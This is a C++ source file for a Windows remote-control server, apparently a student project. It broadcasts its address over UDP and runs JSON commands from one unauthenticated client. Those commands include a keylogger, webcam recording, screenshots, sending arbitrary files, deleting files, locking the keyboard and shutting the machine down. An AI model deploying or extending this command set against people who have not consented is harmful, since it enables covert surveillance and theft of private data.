#include "socket.h"
#include "commands.h"
#include "process.h"

HHOOK keyboardHook = nullptr;
BOOL isConnected = false;

WSADATA initializeWinsock() {
    WSADATA ws;
    if (WSAStartup(MAKEWORD(2, 2), &ws) < 0) {
        cout << "WSA failed to initialize" << endl;
    }
    else cout << "WSA initialized" << endl;

    return ws;
}

SOCKET initializeSocket() {
    SOCKET nSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    if (nSocket < 0) {
        cout << "The Socket not opened" << endl;
    }
    else
        cout << "The Socket opened successfully" << endl;

    return nSocket;
}

sockaddr_in initializeServerSocket() {
    sockaddr_in server;

    server.sin_family = AF_INET;
    server.sin_port = htons(9909);
    server.sin_addr.s_addr = INADDR_ANY;
    memset(&(server.sin_zero), 0, 8);

    return server;
}

void bindAndListen(SOCKET& nSocket, sockaddr_in& server) {
    int nRet = 0;
    nRet = ::bind(nSocket, (sockaddr*)&server, sizeof(sockaddr));

    if (nRet < 0) {
        cout << "Failed to bind to local port" << endl;
        return;
    }
    else cout << "Successfully bind to local port" << endl;

    // Listen the request from client 
    nRet = listen(nSocket, 5);
    if (nRet < 0) {
        cout << "Failed to start listen to local port" << endl;
    }
    else cout << "Started listening to local port" << endl;
}

string getLocalIPAddress() {
    char hostname[256];
    if (gethostname(hostname, sizeof(hostname)) == SOCKET_ERROR) {
        cerr << "Error getting hostname: " << WSAGetLastError() << endl;
        return "";
    }

    struct addrinfo hints, * info;
    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET; // Chỉ IPv4
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    if (getaddrinfo(hostname, NULL, &hints, &info) != 0) {
        cerr << "Error getting local IP: " << WSAGetLastError() << endl;
        return "";
    }

    sockaddr_in* addr = (sockaddr_in*)info->ai_addr;
    char ipStr[INET_ADDRSTRLEN]; // Định nghĩa kích thước cho IPv4
    inet_ntop(AF_INET, &(addr->sin_addr), ipStr, INET_ADDRSTRLEN); // Chuyển địa chỉ thành chuỗi
    freeaddrinfo(info);

    return string(ipStr);
}


void sendBroadcast() {
    SOCKET udpSocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (udpSocket == INVALID_SOCKET) {
        cout << "Failed to create UDP socket: " << WSAGetLastError() << endl;
        return;
    }
    cout << "UDP socket created successfully for broadcasting" << endl;

    // Cho phép gửi broadcast
    BOOL broadcastEnable = TRUE;
    if (setsockopt(udpSocket, SOL_SOCKET, SO_BROADCAST, (char*)&broadcastEnable, sizeof(broadcastEnable)) < 0) {
        cout << "Failed to enable broadcast: " << WSAGetLastError() << endl;
        closesocket(udpSocket);
        return;
    }

    sockaddr_in broadcastAddr;
    broadcastAddr.sin_family = AF_INET;
    broadcastAddr.sin_port = htons(9909);
    broadcastAddr.sin_addr.s_addr = INADDR_BROADCAST;

    //string  message = "Server_IP=127.0.0.1;Port=9909";

    string serverIP = getLocalIPAddress();
    if (serverIP.empty()) {
        cout << "Unable to get server IP address" << endl;
        closesocket(udpSocket);
        return;
    }

    string message = "Server_IP=" + serverIP + ";Port=9909";

    cout << "Broadcasting server information..." << endl;
    while (!isConnected) {
        sendto(udpSocket, message.c_str(), (int)strlen(message.c_str()), 0,
            (sockaddr*)&broadcastAddr, sizeof(broadcastAddr));
        Sleep(5000);
    }

    cout << "Broadcast stopped." << endl;
    closesocket(udpSocket);
}

SOCKET acceptRequestFromClient(SOCKET nSocket) {
    SOCKET clientSocket;
    sockaddr_in client;
    int clientSize = sizeof(client);

    clientSocket = accept(nSocket, (sockaddr*)&client, &clientSize);

    if (clientSocket < 0) {
        cout << "Failed to accept connection" << endl;
        return EXIT_FAILURE;
    }
    else cout << "Client connected successfully" << endl;

    cout << endl;

    return clientSocket;
}

void sendResponse(SOCKET& clientSocket, string jsonResponse) {
    int jsonSize = (int)jsonResponse.size();

    // Gửi kích thước chuỗi JSON trước
    int result = send(clientSocket, reinterpret_cast<char*>(&jsonSize), sizeof(jsonSize), 0);
    if (result == SOCKET_ERROR) {
        cout << "Failed to send JSON size, error: " << WSAGetLastError() << endl;
        return;
    }

    // Gửi nội dung chuỗi JSON
    int bytesSent = 0;
    while (bytesSent < jsonSize) {
        int bytesToSend = min(jsonSize - bytesSent, 1024);
        result = send(clientSocket, jsonResponse.c_str() + bytesSent, bytesToSend, 0);

        if (result == SOCKET_ERROR) {
            cout << "Failed to send JSON data, error: " << WSAGetLastError() << endl;
            break;
        }
        bytesSent += result;
    }
}

void processRequests(SOCKET& clientSocket, SOCKET& nSocket) {
    string receiveBuffer, sendBuffer;

    while (true) {
        receiveBuffer.resize(512);

        int recvResult = recv(clientSocket, &receiveBuffer[0], (int)receiveBuffer.size(), 0);

        if (recvResult <= 0) {
            cout << "Failed to receive data from client" << endl;
            break;
        }
        else {
            receiveBuffer.resize(recvResult);

            json j = json::parse(receiveBuffer);

			// check if the client wants to end the program
            if (j.contains("title")) {
                string command = j.at("title");
                if (command == END_PROGRAM) {
                    cout << "Exit command received. Closing connection" << endl;
                    break;
				}
			}

            //processRequest(clientSocket, receiveBuffer);
            thread([&clientSocket, receiveBuffer]() {
                processRequest(clientSocket, receiveBuffer);
                }).detach();
        }

    }
}

void closeConnection(SOCKET& clientSocket, SOCKET& nSocket) {
    // close connected with client
    closesocket(clientSocket);

    // close socket server
    closesocket(nSocket);
    WSACleanup();
}

void processRequest(SOCKET& clientSocket, string request) {
	// parse the request
    json j = json::parse(request);

    string response = "";
	json jsonResponse;

    if (j.contains("title")) {
		string command = j.at("title");
        if (command == LIST_APP) {
            jsonResponse = listApp();
			sendResponse(clientSocket, jsonResponse.dump());
			if (jsonResponse["status"] == "OK") {
				sendFile(clientSocket, DATA_FILE);
			}
        }
        else if (command == LIST_SERVICE) {
            response = listService();
            sendFile(clientSocket, DATA_FILE);
            sendResponse(clientSocket, response);
        }
        else if (command == LIST_PROCESS) {
            response = listProcess();
            sendFile(clientSocket, DATA_FILE);
            sendResponse(clientSocket, response);
        }
        else if (command == START_APP) {
            if (j.contains("nameObject")) {
                response = startApp(j.at("nameObject"));
                sendResponse(clientSocket, response);
            }
        }
        else if (command == START_SERVICE) {
            if (j.contains("nameObject")) {
                response = startService(j.at("nameObject"));
                sendResponse(clientSocket, response);
            }
        }
        else if (command == STOP_APP) {
            if (j.contains("nameObject")) {
                response = stopApp(j.at("nameObject"));
                sendResponse(clientSocket, response);
            }
        }
        else if (command == STOP_SERVICE) {
            if (j.contains("nameObject")) {
                response = stopService(j.at("nameObject"));
                sendResponse(clientSocket, response);
            }
        }
        else if (command == RESTART) {
            restart();
        }
        else if (command == SHUTDOWN) {
            shutdown();
        }
        else if (command == TURN_ON_WEBCAM) {
            response = turnOnWebcam();
            sendResponse(clientSocket, response);
        }
        else if (command == TURN_OFF_WEBCAM) {
            response = turnOffWebcam();
			sendFile(clientSocket, "output.mp4");
            sendResponse(clientSocket, response);
        }
        else if (command == TAKE_SCREENSHOT) {
            takeScreenshot();

            json j;

            j["title"] = TAKE_SCREENSHOT;

			// send the screenshot to the client
            if (sendFile(clientSocket, "screenShot.png")) {
                j["result"] = "Successfully screenshot";
            }
            else {
                j["result"] = "Failed to screenshot";
            }

            response = j.dump();
            sendResponse(clientSocket, response);
        }
        else if (command == GET_FILE) {
            json temp;

            string fileName = j.at("nameObject");

            j["title"] = GET_FILE;

			// send the file to client
            if (sendFile(clientSocket, fileName)) {
                temp["result"] = "File copied and sent successfully";
                temp["status"] = 1;
            }
            else {
                temp["result"] = "Failed to copy file and send it";
				temp["status"] = 0;
            }

            response = temp.dump();
            sendResponse(clientSocket, response);
        }
        else if (command == COPY_FILE) {
            response = copyFile(j.at("source"), j.at("destination"));
            sendResponse(clientSocket, response);
        }
        else if (command == DELETE_FILE) {
            string filePath = j.at("nameObject");

            response = deleteFile(filePath);
            sendResponse(clientSocket, response);
        }
        else if (command == KEYLOGGER) {
            string t = j.at("nameObject");
            int duration = stoi(t);

            response = keylogger(duration);
            sendFile(clientSocket, DATA_FILE);
            sendResponse(clientSocket, response);
        }
        else if (command == LOCK_KEYBOARD) {
            bool flag = false;
            response = lockKey(flag);
            sendResponse(clientSocket, response);

            if (flag) runKeyLockingLoop();
        }
        else if (command == UNLOCK_KEYBOARD) {
            response = unlockKey();
            sendResponse(clientSocket, response);
        }
        else if (command == LIST_DIRECTORY_TREE) {
            response = listDirectoryTree();
            sendFile(clientSocket, DATA_FILE);
			sendResponse(clientSocket, response);
        }
        else {
            json temp;

            temp["title"] = "Error";
            temp["result"] = "Your request is invalid. Please review and resend it";

            response = temp.dump();
            sendResponse(clientSocket, response);
        }

    }
}
